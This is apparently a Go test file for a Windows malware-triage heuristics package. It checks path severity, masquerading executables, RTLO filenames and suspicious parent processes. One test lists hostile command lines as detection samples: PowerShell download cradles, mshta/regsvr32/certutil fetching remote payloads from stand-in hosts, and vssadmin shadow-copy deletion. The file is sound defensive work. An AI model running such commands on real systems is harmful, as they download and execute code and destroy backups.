package heuristics

import (
	"testing"

	"husmea/internal/core"
)

func TestClassifyPath(t *testing.T) {
	cases := []struct {
		path string
		cat  string
		sev  core.Severity
		root bool
	}{
		{`C:\Users\bob\AppData\Local\Temp\x.exe`, "temp", core.High, true},
		{`C:\Windows\Temp\sub\x.exe`, "temp", core.High, false},
		{`C:\Users\bob\AppData\Roaming\evil.exe`, "roaming", core.High, true},
		{`C:\Users\bob\AppData\Roaming\Vendor\app.exe`, "roaming", core.Medium, false},
		{`C:\Users\bob\AppData\Local\Programs\App\app.exe`, "local", core.Low, false},
		{`C:\ProgramData\svc.exe`, "programdata", core.High, true},
		{`C:\Users\Public\Libraries\a.dll`, "public", core.High, false},
		{`C:\$Recycle.Bin\S-1-5-21\x.exe`, "recycle", core.Critical, false},
		{`C:\Windows\System32\svchost.exe`, "windows", core.Info, false},
		{`C:\Program Files\App\app.exe`, "programfiles", core.Info, false},
		{`"c:/users/bob/downloads/setup.exe"`, "downloads", core.Medium, true},
		{`\\server\share\x.exe`, "unc", core.Medium, false},
	}
	for _, c := range cases {
		l := ClassifyPath(c.path)
		if l.Category != c.cat || l.Severity != c.sev || l.RootDrop != c.root {
			t.Errorf("ClassifyPath(%q) = %+v, want cat=%s sev=%s root=%v", c.path, l, c.cat, c.sev, c.root)
		}
	}
}

func TestTrustedLocation(t *testing.T) {
	if !IsTrustedLocation(`C:\Windows\System32\cmd.exe`) || !IsTrustedLocation(`C:\Program Files (x86)\X\x.exe`) {
		t.Fatal("system dirs should be trusted")
	}
	if IsTrustedLocation(`C:\Windows\Temp\x.exe`) || IsTrustedLocation(`C:\Users\a\x.exe`) {
		t.Fatal("writable dirs should not be trusted")
	}
}

func TestMasquerade(t *testing.T) {
	if r := Masquerade(`C:\Windows\System32\svchost.exe`); r != nil {
		t.Errorf("legit svchost flagged: %v", r)
	}
	if r := Masquerade(`C:\Windows\explorer.exe`); r != nil {
		t.Errorf("legit explorer flagged: %v", r)
	}
	if r := Masquerade(`C:\Users\bob\AppData\Roaming\svchost.exe`); r == nil || r.Severity != core.Critical {
		t.Errorf("fake svchost not critical: %v", r)
	}
	if r := Masquerade(`C:\Users\bob\scvhost.exe`); r == nil || r.Severity != core.High {
		t.Errorf("typosquat not detected: %v", r)
	}
	if r := Masquerade(`C:\Program Files\App\chrome.exe`); r != nil {
		t.Errorf("unrelated name flagged: %v", r)
	}
}

func TestDoubleExtension(t *testing.T) {
	if DoubleExtension(`C:\x\factura.pdf.exe`) == nil {
		t.Error("factura.pdf.exe not flagged")
	}
	if DoubleExtension(`C:\x\setup.1.2.exe`) != nil {
		t.Error("version numbers should not be flagged")
	}
	if r := DoubleExtension("C:\\x\\invoice\u202efdp.exe"); r == nil || r.Severity != core.Critical {
		t.Error("RTLO not flagged")
	}
}

func TestParseCommandLine(t *testing.T) {
	cases := []struct {
		in, exe, args string
		unquoted      bool
	}{
		{`"C:\Program Files\App\a.exe" -k x`, `C:\Program Files\App\a.exe`, "-k x", false},
		{`C:\Windows\system32\svchost.exe -k netsvcs -p`, `C:\Windows\system32\svchost.exe`, "-k netsvcs -p", false},
		{`C:\Program Files\My App\svc.exe /run`, `C:\Program Files\My App\svc.exe`, "/run", true},
		{`rundll32.exe C:\x\a.dll,Run`, `rundll32.exe`, `C:\x\a.dll,Run`, false},
		{`notepad`, `notepad`, "", false},
	}
	for _, c := range cases {
		p := ParseCommandLine(c.in, nil)
		if p.Exe != c.exe || p.Args != c.args || p.UnquotedSpaces != c.unquoted {
			t.Errorf("ParseCommandLine(%q) = %+v", c.in, p)
		}
	}
	exists := func(p string) bool { return p == `C:\Tools\a b.exe` }
	if p := ParseCommandLine(`C:\Tools\a b.exe c.exe`, exists); p.Exe != `C:\Tools\a b.exe` || p.Args != "c.exe" {
		t.Errorf("exists disambiguation failed: %+v", p)
	}
}

func hasSev(rs []core.Reason, min core.Severity) bool { return MaxSeverity(rs) >= min }

func TestAssessCommandLine(t *testing.T) {
	bad := map[string]core.Severity{
		`powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA`: core.High,
		`powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://x/a')"`: core.High,
		`mshta.exe http://evil.example/a.hta`:                                         core.High,
		`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"`:                     core.Critical,
		`regsvr32 /s /n /u /i:http://x/file.sct scrobj.dll`:                           core.High,
		`certutil.exe -urlcache -split -f http://x/a.exe a.exe`:                       core.High,
		`cmd /c vssadmin delete shadows /all /quiet`:                                  core.Critical,
		`wscript.exe C:\Users\bob\AppData\Roaming\x.vbs`:                              core.High,
		`curl http://1.2.3.4/a`:                                                       core.High,
	}
	for cmd, min := range bad {
		if rs := AssessCommandLine(cmd); !hasSev(rs, min) {
			t.Errorf("AssessCommandLine(%q) = %v, want >= %s", cmd, rs, min)
		}
	}
	good := []string{
		`C:\Windows\system32\svchost.exe -k netsvcs -p`,
		`"C:\Program Files\App\app.exe" --minimized`,
		`powershell.exe -File C:\Scripts\backup.ps1`,
	}
	for _, cmd := range good {
		if rs := AssessCommandLine(cmd); len(rs) > 0 {
			t.Errorf("benign %q flagged: %v", cmd, rs)
		}
	}
	// A specific URL rule should suppress the generic one.
	rs := AssessCommandLine(`mshta.exe http://evil.example/a.hta`)
	for _, r := range rs {
		if r.Text == "la línea de comandos contiene una URL" {
			t.Error("generic URL reason should be suppressed")
		}
	}
}

func TestParentChild(t *testing.T) {
	if r := ParentChild("WINWORD.EXE", "powershell.exe"); r == nil || r.Severity != core.High {
		t.Error("office -> powershell not flagged")
	}
	if r := ParentChild("explorer.exe", "svchost.exe"); r == nil {
		t.Error("svchost with wrong parent not flagged")
	}
	if r := ParentChild("services.exe", "svchost.exe"); r != nil {
		t.Error("legit svchost flagged")
	}
	if r := ParentChild("", "lsass.exe"); r != nil {
		t.Error("unknown parent should not be flagged")
	}
}

func TestPayload(t *testing.T) {
	if p := Payload(`C:\Windows\System32\rundll32.exe`, `C:\Users\a\AppData\x.dll,Start`); p != `C:\Users\a\AppData\x.dll` {
		t.Errorf("rundll32 payload = %q", p)
	}
	if p := Payload(`wscript.exe`, `//B "C:\Users\a b\run.vbs"`); p != `C:\Users\a b\run.vbs` {
		t.Errorf("wscript payload = %q", p)
	}
	if p := Payload(`C:\app\app.exe`, `C:\x\a.dll`); p != "" {
		t.Errorf("non-host should have no payload, got %q", p)
	}
}

func TestAssessLaunch(t *testing.T) {
	ms := core.Signature{Status: "Valid", Signer: "CN=Microsoft Windows, O=Microsoft Corporation"}
	// Signed app in Program Files: nothing to report.
	if rs := AssessLaunch(Launch{Exe: ExeRef{Path: `C:\Program Files\App\a.exe`, Exists: true, Sig: core.Signature{Status: "Valid", Signer: "CN=App"}}}); len(rs) != 0 {
		t.Errorf("benign launch flagged: %v", rs)
	}
	// Unsigned exe in %APPDATA% root: high, escalated to critical by two strong reasons.
	rs := AssessLaunch(Launch{Exe: ExeRef{Path: `C:\Users\a\AppData\Roaming\upd.exe`, Exists: true, Sig: core.Signature{Status: "NotSigned"}}})
	if sev, _, _ := core.Combine(rs); sev != core.Critical {
		t.Errorf("unsigned roaming root exe = %s (%v)", sev, rs)
	}
	// rundll32 with a signed system DLL: low only.
	rs = AssessLaunch(Launch{
		Exe:     ExeRef{Path: `C:\Windows\System32\rundll32.exe`, Exists: true, Sig: ms, CommandLine: `C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL`},
		Payload: &ExeRef{Path: `C:\Windows\System32\shell32.dll`, Exists: true, Sig: ms},
	})
	if sev, _, _ := core.Combine(rs); sev != core.Low {
		t.Errorf("rundll32 system dll = %s (%v)", sev, rs)
	}
	// Vendor entries launching interpreters are not flagged by that alone.
	rs = AssessLaunch(Launch{Exe: ExeRef{Path: `C:\Windows\System32\cmd.exe`, Exists: true, Sig: ms}, Vendor: true})
	if len(rs) != 0 {
		t.Errorf("vendor cmd flagged: %v", rs)
	}
	// Missing binary in user path.
	rs = AssessLaunch(Launch{Exe: ExeRef{Path: `C:\Users\a\AppData\Roaming\gone.exe`, Exists: false}})
	if !hasSev(rs, core.Medium) {
		t.Errorf("missing roaming binary = %v", rs)
	}
}

func TestSignedPerUserAppsNotFlagged(t *testing.T) {
	for _, p := range []string{
		`C:\Users\a\AppData\Local\Microsoft\OneDrive\OneDrive.exe`,
		`C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe`,
		`C:\Users\a\AppData\Roaming\Spotify\Spotify.exe`,
	} {
		rs := AssessExecutable(ExeRef{Path: p, Exists: true, Sig: core.Signature{Status: "Valid", Signer: "CN=Vendor"}})
		if len(rs) != 0 {
			t.Errorf("%s flagged: %v", p, rs)
		}
	}
}
